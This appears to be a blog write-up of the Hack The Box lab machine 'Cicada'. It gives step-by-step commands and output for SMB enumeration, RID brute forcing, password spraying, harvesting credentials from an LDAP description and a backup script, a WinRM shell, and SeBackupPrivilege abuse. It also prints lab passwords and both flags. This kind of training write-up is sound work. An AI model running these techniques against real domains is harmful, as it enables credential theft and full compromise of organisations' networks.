---
title: HTB - Cicada
date: 2026-10-18 14:03:48 +0000
categories: [HTB, Easy]
tags: [windows, active-directory, smb, ldap, backup-operators, sebackupprivilege]
---

## Machine Information

Cicada is an Easy-rated Windows Active Directory machine on Hack The Box built around a chain of leaked credentials — a default password in an SMB-shared HR notice, a password stored in a user's LDAP description field, and a hardcoded credential in a backup script — culminating in a Backup Operators group membership that allows full file system access via `SeBackupPrivilege`.

- **IP:** 10.129.231.149
- **OS:** Windows Server 2022 Build 20348
- **Difficulty:** Easy
- **Domain:** cicada.htb

## Reconnaissance

### Nmap Scan

```bash
nmap -Pn -sC -sV 10.129.231.149
```
```bash
PORT STATE SERVICE VERSION
53/tcp open domain Simple DNS Plus
88/tcp open kerberos-sec Microsoft Windows Kerberos
135/tcp open msrpc Microsoft Windows RPC
139/tcp open netbios-ssn Microsoft Windows netbios-ssn
389/tcp open ldap Microsoft Windows Active Directory LDAP (Domain: cicada.htb0., Site: Default-First-Site-Name)
445/tcp open microsoft-ds?
464/tcp open kpasswd5?
593/tcp open ncacn_http Microsoft Windows RPC over HTTP 1.0
636/tcp open ssl/ldap Microsoft Windows Active Directory LDAP
3268/tcp open ldap Microsoft Windows Active Directory LDAP
3269/tcp open ssl/ldap Microsoft Windows Active Directory LDAP
5985/tcp open http Microsoft HTTPAPI httpd 2.0 (WinRM)
```

Certificate CN confirms the DC hostname: `CICADA-DC.cicada.htb`. Port 5985 (WinRM) open is notable for later lateral movement.

### SMB Share Enumeration (Guest)

```bash
netexec smb 10.129.231.149 -u guest -p '' --shares
```

Share Permissions Remark
```bash
ADMIN$ Remote Admin
C$ Default share
DEV
HR READ
IPC$ READ Remote IPC
NETLOGON Logon server share
SYSVOL Logon server share
```

The `HR` share is guest-readable.

## Foothold

### Leaked Default Password

```bash
smbclient -N //10.129.231.149/HR
get "Notice from HR.txt"
```

The file is an onboarding notice containing a company-wide default password:

Your default password is: Cicada$M6Corpb*@Lp#nZp!8


### User Enumeration via RID Brute Force

```bash
nxc smb 10.129.231.149 -u 'guest' -p '' --rid-brute
```

Extracted domain users:
```bash
Administrator
Guest
krbtgt
john.smoulder
sarah.dantelia
michael.wrightson
david.orelious
Dev
emily.oscars
```

### Password Spraying the Default Password

```bash
nxc smb 10.129.231.149 -u users.txt -p 'Cicada$M6Corpb*@Lp#nZp!8' --continue-on-success
```

[+] cicada.htb\michael.wrightson:Cicada$M6Corpb*@Lp#nZp!8
[+] cicada.htb\Dev:Cicada$M6Corpb*@Lp#nZp!8 (Guest)


`michael.wrightson` still had the default onboarding password set.

### LDAP User Description Enumeration

With a valid domain account, pulled user descriptions over LDAP:

```bash
nxc ldap 10.129.231.149 -u michael.wrightson -p 'Cicada$M6Corpb*@Lp#nZp!8' --users
```

david.orelious 2024-03-14 08:17:29 2 Just in case I forget my password is aRt$Lp#7t*VQ!3


The `david.orelious` description field leaks a plaintext password — a classic AD misconfiguration where admins store credentials/hints in user attributes.

### Pivoting to david.orelious

```bash
nxc smb 10.129.231.149 -u david.orelious -p 'aRt$Lp#7t*VQ!3' --shares
```

Share Permissions Remark
```bash
DEV READ
HR READ
NETLOGON READ
SYSVOL READ
```

This account can now read the `DEV` share.

### Backup Script Credential Leak

```bash
smbclient //10.129.231.149/DEV -U 'cicada.htb/david.orelious'
get Backup_script.ps1
```

```powershell
$sourceDirectory = "C:\smb"
$destinationDirectory = "D:\Backup"

$username = "emily.oscars"
$password = ConvertTo-SecureString "Q!3@Lp#M6b*7t*Vt" -AsPlainText -Force
$credentials = New-Object System.Management.Automation.PSCredential($username, $password)
...
```

A hardcoded backup script credential for `emily.oscars` was sitting on the readable share.

### Shell Access as emily.oscars

```bash
evil-winrm -i 10.129.231.149 -u emily.oscars -p 'Q!3@Lp#M6b*7t*Vt'
```

Evil-WinRM PS C:\Users\emily.oscars.CICADA\Documents> whoami
cicada\emily.oscars


User flag:

```bash
type user.txt
```

4dee149e0d1b5c5fd1f3c53933afd5df


## Privilege Escalation

### Backup Operators Group

```bash
whoami /all
```
BUILTIN\Backup Operators Alias S-1-5-32-551 Mandatory group, Enabled by default, Enabled group
...
PRIVILEGES INFORMATION

SeBackupPrivilege Back up files and directories Enabled
SeRestorePrivilege Restore files and directories Enabled


`emily.oscars` is a member of **Backup Operators** with `SeBackupPrivilege` enabled — this grants read access to any file on the filesystem regardless of ACLs, bypassing normal permission checks for backup purposes. This is the same privilege escalation technique covered in my [Baby writeup](https://cyberhitman3.github.io/posts/htb-baby/).

### Exploiting SeBackupPrivilege

Used the backup privilege to copy the Administrator's desktop contents out of the protected profile directory:

```powershell
robocopy C:\Users\Administrator\Desktop C:\temp root.txt /B
type C:\temp\root.txt
```

33f12e0310ada248af9ec9f677c6aa2c


## Summary

| Stage | Technique |
|---|---|
| Recon | Nmap service scan identified AD DC with WinRM enabled |
| Enumeration | Guest SMB access to `HR` share leaked default password |
| Foothold 1 | Default password spray → `michael.wrightson` |
| Foothold 2 | LDAP description field leak → `david.orelious` |
| Foothold 3 | Hardcoded credential in `Backup_script.ps1` → `emily.oscars` |
| Privesc | `Backup Operators` membership / `SeBackupPrivilege` → read Administrator's files |

**Key takeaway:** This box is a textbook case of credential sprawl across an AD environment — default passwords left unchanged, secrets stored in LDAP description fields, and plaintext credentials hardcoded into scripts on shared drives. Each individually minor leak chained into full compromise. `SeBackupPrivilege` abuse (also seen on Baby) remains a reliable path whenever a compromised account lands in Backup Operators, since it bypasses DACLs entirely for read operations.
